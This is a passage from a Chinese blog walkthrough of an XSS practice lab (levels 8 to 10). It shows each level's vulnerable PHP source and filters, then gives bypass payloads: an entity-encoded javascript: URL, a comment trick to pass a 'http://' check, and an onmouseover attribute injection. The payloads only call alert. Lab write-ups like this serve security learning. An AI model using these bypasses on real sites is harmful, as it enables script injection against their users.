+<h2 id="第八关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt-、双引号也被转化"><a href="#第八关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt-、双引号也被转化" class="headerlink" title="第八关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef、script转化src_ipt`、双引号也被转化)"></a>第八关——<code></code>htmlspecialchars($str)<code>部分转化(双引号拼接、</code>strtolower()<code>、将</code>on<code>转化</code>0_n<code>、</code>src<code>转化</code>sr_c<code>、</code>data<code>转化</code>da_ta<code>、</code>href<code>转化</code>hr_ef<code>、</code>script<code>转化</code>src_ipt`、双引号也被转化)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>怎么办呢？只能编码绕过了，再利用<code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code>构造一个</p>
+<p><a href="javascript:alert(/xss/)" target="_blank" rel="noopener"></a></p>
+<p>需要注意的是，再进行过程中，不要在浏览器url框中输入，应当在文本框中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/xss练习（一）/1563438053795.png" alt="1563438053795"></p>
+<p>否则会出现如下情况</p>
+<p><img src="/2019/08/15/xss练习（一）/1563438113970.png" alt="1563438113970"></p>
+<h2 id="第九关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt、双引号也被转化，过滤后strpos-指定字符串限制"><a href="#第九关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt、双引号也被转化，过滤后strpos-指定字符串限制" class="headerlink" title="第九关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef、script转化src_ipt、双引号也被转化，过滤后strpos()指定字符串限制)"></a>第九关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、<code>strtolower()</code>、将<code>on</code>转化<code>0_n</code>、<code>src</code>转化<code>sr_c</code>、<code>data</code>转化<code>da_ta</code>、<code>href</code>转化<code>hr_ef</code>、<code>script</code>转化<code>src_ipt</code>、双引号也被转化，过滤后<code>strpos()</code>指定字符串限制)</h2><p>先试试呗</p>
+<p><img src="/2019/08/15/xss练习（一）/1563438796204.png" alt="1563438796204"></p>
+<p>看下源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.$str7.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>其中我们先看懂下<code>strpos()</code>这个函数的意思</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int</span><br><span class="line">返回 needle 在 haystack 中首次出现的数字位置。</span><br><span class="line">如果没找到 needle，将返回 FALSE。</span><br></pre></td></tr></table></figure>
+<p>那只要<code>$str7</code>存在<code>http://</code>这个就行啦？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)&lt;!--http://--&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/xss练习（一）/1563440063733.png" alt="1563440063733"></p>
+<h2 id="第十关——htmlspecialchars-str-部分转化-双引号、单引号被转化，隐形标签利用"><a href="#第十关——htmlspecialchars-str-部分转化-双引号、单引号被转化，隐形标签利用" class="headerlink" title="第十关——htmlspecialchars($str)部分转化(双引号、单引号被转化，隐形标签利用)"></a>第十关——<code>htmlspecialchars($str)</code>部分转化(双引号、单引号被转化，隐形标签利用)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过源码直接分析<code>keyword</code>的值没办法利用了，因为<code>&lt;</code>和<code>&gt;</code>被<code>htmlspecialchars</code>转化为<code>html</code>实体了，无法构造标签闭合。</p>
+<p>但是还有一个t_sort的值，不过在网页中是隐形的。想想如何构造，只是过滤了<code>&lt;</code>和<code>&gt;</code>，想了想构造如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ghjkl&quot; onmouseover=&quot;alert(/xss/)&quot; type=&quot;text</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/xss练习（一）/1563441204204.png" alt="1563441204204"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/" rel="next" title="使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）">
+                <i class="fa fa-chevron-left"></i> 使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/22/exe分析（一）/" rel="prev" title="exe分析（一）">
+                exe分析（一） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/person_image.jpg"
+                alt="jianghuxia" />
+            
+              <p class="site-author-name" itemprop="name">jianghuxia</p>
+              <p class="site-description motion-element" itemprop="description">Stay Hungry. Stay Foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS练习"><span class="nav-number">1.</span> <span class="nav-text">XSS练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一关——无任何过滤"><span class="nav-number">1.1.</span> <span class="nav-text">第一关——无任何过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二关——htmlspecialchars-str-部分转化"><span class="nav-number">1.2.</span> <span class="nav-text">第二关——htmlspecialchars($str)部分转化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三关——htmlspecialchars-str-全部转化-单引号"><span class="nav-number">1.3.</span> <span class="nav-text">第三关——htmlspecialchars($str)全部转化(单引号)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四关——htmlspecialchars-str-部分转化-双引号拼接、过滤-lt-和-gt"><span class="nav-number">1.4.</span> <span class="nav-text">第四关——htmlspecialchars($str)部分转化(双引号拼接、过滤&lt;和&gt;)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第五关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n"><span class="nav-number">1.5.</span> <span class="nav-text">第五关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第六关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef"><span class="nav-number">1.6.</span> <span class="nav-text">第六关——htmlspecialchars($str)部分转化(双引号拼接、无strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第七关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将script、on、src、data、href转化"><span class="nav-number">1.7.</span> <span class="nav-text">第七关——htmlspecialchars($str)部分转化(双引号拼接、无strtolower()、将script、on、src、data、href转化)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第八关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt-、双引号也被转化"><span class="nav-number">1.8.</span> <span class="nav-text">第八关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef、script转化src_ipt`、双引号也被转化)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第九关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt、双引号也被转化，过滤后strpos-指定字符串限制"><span class="nav-number">1.9.</span> <span class="nav-text">第九关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef、script转化src_ipt、双引号也被转化，过滤后strpos()指定字符串限制)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第十关——htmlspecialchars-str-部分转化-双引号、单引号被转化，隐形标签利用"><span class="nav-number">1.10.</span> <span class="nav-text">第十关——htmlspecialchars($str)部分转化(双引号、单引号被转化，隐形标签利用)</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jianghuxia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
